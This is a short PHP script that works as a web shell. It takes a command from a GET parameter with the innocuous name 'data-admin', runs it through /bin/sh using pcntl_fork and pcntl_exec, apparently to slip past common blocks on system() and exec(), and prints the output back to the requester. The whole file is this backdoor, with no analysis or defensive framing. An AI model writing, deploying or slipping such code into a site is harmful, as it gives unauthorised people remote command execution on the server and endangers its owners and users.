<?php
if (isset($_GET['data-admin'])) {
    $cmd = trim($_GET['data-admin']);
    if ($cmd !== '') {
        $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
        if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                echo "Fork failed.";
            } elseif ($pid === 0) {
                pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"]);
                exit(1);
            } else {
                pcntl_wait($status);
                if (file_exists($tmpFile)) {
                    echo "<pre>" . htmlspecialchars(file_get_contents($tmpFile)) . "</pre>";
                    unlink($tmpFile);
                } else {
                    echo "No output.";
                }
            }
        } else {
            echo "pcntl functions not available.";
        }
    }
}
?>
